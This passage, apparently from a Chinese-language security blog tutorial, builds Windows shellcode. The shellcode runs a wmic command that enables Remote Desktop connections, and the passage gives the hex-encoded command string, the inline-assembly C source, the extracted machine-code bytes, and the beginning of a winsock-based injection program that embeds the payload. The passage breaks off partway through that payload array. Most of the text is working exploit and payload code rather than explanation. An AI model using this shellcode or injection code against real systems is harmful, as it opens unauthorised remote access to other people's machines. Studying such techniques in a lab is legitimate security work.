+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">开启远程桌面控制：wmic PATH win32_terminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1</span><br><span class="line">关闭远程桌面控制：wmic PATH win32_terminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 0</span><br></pre></td></tr></table></figure>
+<ol>
+<li>然后我们就只需要将命令转化为硬编码，写入到汇编代码中即可，如下就是上述命令转化为ASCII码值的结果，共87个字符，所以我们需要从ebp-0x58开始填写。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x77,0x6d,0x69,0x63,0x20,0x50,0x41,0x54,0x48,0x20,0x77,0x69,0x6e,0x33,0x32,0x5f,0x74,0x65,0x72,0x6d,0x69,0x6e,0x61,0x6c,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x73,0x65,0x74,0x74,0x69,0x6e,0x67,0x20,0x57,0x48,0x45,0x52,0x45,0x20,0x28,0x5f,0x5f,0x43,0x6c,0x61,0x73,0x73,0x21,0x3d,0x22,0x22,0x29,0x20,0x43,0x41,0x4c,0x4c,0x20,0x53,0x65,0x74,0x41,0x6c,0x6c,0x6f,0x77,0x54,0x53,0x43,0x6f,0x6e,0x6e,0x65,0x63,0x74,0x69,0x6f,0x6e,0x73,0x20,0x31</span><br></pre></td></tr></table></figure>
+<ol>
+<li>然后修改shellcode，修改为我们上述的shellcode，注意需要抬高栈顶，否则装不下shellcode。</li>
+</ol>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LoadLibrary(<span class="string">"msvcrt.dll"</span>);</span><br><span class="line">	__asm &#123;</span><br><span class="line">			push ebp ;保存ebp，esp－<span class="number">4</span></span><br><span class="line">			mov ebp,esp ;给ebp赋新值，将作为局部变量的基指针</span><br><span class="line">			<span class="keyword">xor</span> edi,edi ;</span><br><span class="line">			push edi ;压入<span class="number">0</span>，esp－<span class="number">4</span>,</span><br><span class="line">;作用是构造字符串的结尾\<span class="number">0</span>字符 </span><br><span class="line"> 			sub esp,<span class="number">60</span>h</span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x58</span>], <span class="number">0x77</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x57</span>], <span class="number">0x6d</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x56</span>], <span class="number">0x69</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x55</span>], <span class="number">0x63</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x54</span>], <span class="number">0x20</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x53</span>], <span class="number">0x50</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x52</span>], <span class="number">0x41</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x51</span>], <span class="number">0x54</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x50</span>], <span class="number">0x48</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x4f</span>], <span class="number">0x20</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x4e</span>], <span class="number">0x77</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x4d</span>], <span class="number">0x69</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x4c</span>], <span class="number">0x6e</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x4b</span>], <span class="number">0x33</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x4a</span>], <span class="number">0x32</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x49</span>], <span class="number">0x5f</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x48</span>], <span class="number">0x74</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x47</span>], <span class="number">0x65</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x46</span>], <span class="number">0x72</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x45</span>], <span class="number">0x6d</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x44</span>], <span class="number">0x69</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x43</span>], <span class="number">0x6e</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x42</span>], <span class="number">0x61</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x41</span>], <span class="number">0x6c</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x40</span>], <span class="number">0x73</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x3f</span>], <span class="number">0x65</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x3e</span>], <span class="number">0x72</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x3d</span>], <span class="number">0x76</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x3c</span>], <span class="number">0x69</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x3b</span>], <span class="number">0x63</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x3a</span>], <span class="number">0x65</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x39</span>], <span class="number">0x73</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x38</span>], <span class="number">0x65</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x37</span>], <span class="number">0x74</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x36</span>], <span class="number">0x74</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x35</span>], <span class="number">0x69</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x34</span>], <span class="number">0x6e</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x33</span>], <span class="number">0x67</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x32</span>], <span class="number">0x20</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x31</span>], <span class="number">0x57</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x30</span>], <span class="number">0x48</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x2f</span>], <span class="number">0x45</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x2e</span>], <span class="number">0x52</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x2d</span>], <span class="number">0x45</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x2c</span>], <span class="number">0x20</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x2b</span>], <span class="number">0x28</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x2a</span>], <span class="number">0x5f</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x29</span>], <span class="number">0x5f</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x28</span>], <span class="number">0x43</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x27</span>], <span class="number">0x6c</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x26</span>], <span class="number">0x61</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x25</span>], <span class="number">0x73</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x24</span>], <span class="number">0x73</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x23</span>], <span class="number">0x21</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x22</span>], <span class="number">0x3d</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x21</span>], <span class="number">0x22</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x20</span>], <span class="number">0x22</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x1f</span>], <span class="number">0x29</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x1e</span>], <span class="number">0x20</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x1d</span>], <span class="number">0x43</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x1c</span>], <span class="number">0x41</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x1b</span>], <span class="number">0x4c</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x1a</span>], <span class="number">0x4c</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x19</span>], <span class="number">0x20</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x18</span>], <span class="number">0x53</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x17</span>], <span class="number">0x65</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x16</span>], <span class="number">0x74</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x15</span>], <span class="number">0x41</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x14</span>], <span class="number">0x6c</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x13</span>], <span class="number">0x6c</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x12</span>], <span class="number">0x6f</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x11</span>], <span class="number">0x77</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x10</span>], <span class="number">0x54</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0xf</span>], <span class="number">0x53</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0xe</span>], <span class="number">0x43</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0xd</span>], <span class="number">0x6f</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0xc</span>], <span class="number">0x6e</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0xb</span>], <span class="number">0x6e</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0xa</span>], <span class="number">0x65</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x9</span>], <span class="number">0x63</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x8</span>], <span class="number">0x74</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x7</span>], <span class="number">0x69</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x6</span>], <span class="number">0x6f</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x5</span>], <span class="number">0x6e</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x4</span>], <span class="number">0x73</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x3</span>], <span class="number">0x20</span></span><br><span class="line">                mov byte ptr ss:[ebp - <span class="number">0x2</span>], <span class="number">0x31</span></span><br><span class="line"> 			lea eax,[ebp<span class="number">-58</span>h] ;</span><br><span class="line"> 			push eax ;串地址作为参数入栈</span><br><span class="line"> 			mov eax, <span class="number">0x77bf93c7</span>;</span><br><span class="line"> 			call eax ;调用system</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>获得汇编机器码，然后调式状态下反汇编，获取汇编代码。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 33 FF 57 83 EC 60 36</span><br><span class="line">C6 45 A8 77 36 C6 45 A9 6D 36</span><br><span class="line">C6 45 AA 69 36 C6 45 AB 63 36</span><br><span class="line">C6 45 AC 20 36 C6 45 AD 50 36</span><br><span class="line">C6 45 AE 41 36 C6 45 AF 54 36</span><br><span class="line">C6 45 B0 48 36 C6 45 B1 20 36</span><br><span class="line">C6 45 B2 77 36 C6 45 B3 69 36</span><br><span class="line">C6 45 B4 6E 36 C6 45 B5 33 36</span><br><span class="line">C6 45 B6 32 36 C6 45 B7 5F 36</span><br><span class="line">C6 45 B8 74 36 C6 45 B9 65 36</span><br><span class="line">C6 45 BA 72 36 C6 45 BB 6D 36</span><br><span class="line">C6 45 BC 69 36 C6 45 BD 6E 36</span><br><span class="line">C6 45 BE 61 36 C6 45 BF 6C 36</span><br><span class="line">C6 45 C0 73 36 C6 45 C1 65 36</span><br><span class="line">C6 45 C2 72 36 C6 45 C3 76 36</span><br><span class="line">C6 45 C4 69 36 C6 45 C5 63 36</span><br><span class="line">C6 45 C6 65 36 C6 45 C7 73 36</span><br><span class="line">C6 45 C8 65 36 C6 45 C9 74 36</span><br><span class="line">C6 45 CA 74 36 C6 45 CB 69 36</span><br><span class="line">C6 45 CC 6E 36 C6 45 CD 67 36</span><br><span class="line">C6 45 CE 20 36 C6 45 CF 57 36</span><br><span class="line">C6 45 D0 48 36 C6 45 D1 45 36</span><br><span class="line">C6 45 D2 52 36 C6 45 D3 45 36</span><br><span class="line">C6 45 D4 20 36 C6 45 D5 28 36</span><br><span class="line">C6 45 D6 5F 36 C6 45 D7 5F 36</span><br><span class="line">C6 45 D8 43 36 C6 45 D9 6C 36</span><br><span class="line">C6 45 DA 61 36 C6 45 DB 73 36</span><br><span class="line">C6 45 DC 73 36 C6 45 DD 21 36</span><br><span class="line">C6 45 DE 3D 36 C6 45 DF 22 36</span><br><span class="line">C6 45 E0 22 36 C6 45 E1 29 36</span><br><span class="line">C6 45 E2 20 36 C6 45 E3 43 36</span><br><span class="line">C6 45 E4 41 36 C6 45 E5 4C 36</span><br><span class="line">C6 45 E6 4C 36 C6 45 E7 20 36</span><br><span class="line">C6 45 E8 53 36 C6 45 E9 65 36</span><br><span class="line">C6 45 EA 74 36 C6 45 EB 41 36</span><br><span class="line">C6 45 EC 6C 36 C6 45 ED 6C 36</span><br><span class="line">C6 45 EE 6F 36 C6 45 EF 77 36</span><br><span class="line">C6 45 F0 54 36 C6 45 F1 53 36</span><br><span class="line">C6 45 F2 43 36 C6 45 F3 6F 36</span><br><span class="line">C6 45 F4 6E 36 C6 45 F5 6E 36</span><br><span class="line">C6 45 F6 65 36 C6 45 F7 63 36</span><br><span class="line">C6 45 F8 74 36 C6 45 F9 69 36</span><br><span class="line">C6 45 FA 6F 36 C6 45 FB 6E 36</span><br><span class="line">C6 45 FC 73 36 C6 45 FD 20 36</span><br><span class="line">C6 45 FE 31 8D 45 A8 50 B8 C7</span><br><span class="line">93 BF 77 FF D0</span><br></pre></td></tr></table></figure>
+<p><a href="https://imgchr.com/i/BSUvYn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSUvYn.md.png" alt="BSUvYn.md.png"></a></p>
+<ol>
+<li>然后修改注入程序的shell部分，其余代码部分同上。</li>
+</ol>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;MSWSock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LEN 2000</span></span><br><span class="line"><span class="keyword">char</span> shell[] =&#123;</span><br><span class="line">	<span class="number">0x55</span>,<span class="number">0x8B</span>,<span class="number">0xEC</span>,<span class="number">0x33</span>,<span class="number">0xFF</span>,<span class="number">0x57</span>,<span class="number">0x83</span>,<span class="number">0xEC</span>,</span><br><span class="line"><span class="number">0x60</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA8</span>,<span class="number">0x77</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xA9</span>,<span class="number">0x6D</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xAA</span>,<span class="number">0x69</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xAB</span>,<span class="number">0x63</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xAC</span>,<span class="number">0x20</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xAD</span>,<span class="number">0x50</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xAE</span>,<span class="number">0x41</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xAF</span>,</span><br><span class="line"><span class="number">0x54</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB0</span>,<span class="number">0x48</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xB1</span>,<span class="number">0x20</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB2</span>,<span class="number">0x77</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB3</span>,<span class="number">0x69</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xB4</span>,<span class="number">0x6E</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB5</span>,<span class="number">0x33</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB6</span>,<span class="number">0x32</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB7</span>,</span><br><span class="line"><span class="number">0x5F</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB8</span>,<span class="number">0x74</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xB9</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xBA</span>,<span class="number">0x72</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xBB</span>,<span class="number">0x6D</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xBC</span>,<span class="number">0x69</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xBD</span>,<span class="number">0x6E</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xBE</span>,<span class="number">0x61</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xBF</span>,</span><br><span class="line"><span class="number">0x6C</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC0</span>,<span class="number">0x73</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xC1</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC2</span>,<span class="number">0x72</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC3</span>,<span class="number">0x76</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xC4</span>,<span class="number">0x69</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC5</span>,<span class="number">0x63</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC6</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC7</span>,</span><br><span class="line"><span class="number">0x73</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC8</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xC9</span>,<span class="number">0x74</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xCA</span>,<span class="number">0x74</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xCB</span>,<span class="number">0x69</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xCC</span>,<span class="number">0x6E</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xCD</span>,<span class="number">0x67</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xCE</span>,<span class="number">0x20</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0x57</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD0</span>,<span class="number">0x48</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xD1</span>,<span class="number">0x45</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD2</span>,<span class="number">0x52</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD3</span>,<span class="number">0x45</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xD4</span>,<span class="number">0x20</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD5</span>,<span class="number">0x28</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD6</span>,<span class="number">0x5F</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD7</span>,</span><br><span class="line"><span class="number">0x5F</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD8</span>,<span class="number">0x43</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xD9</span>,<span class="number">0x6C</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDA</span>,<span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x36</span>,<span 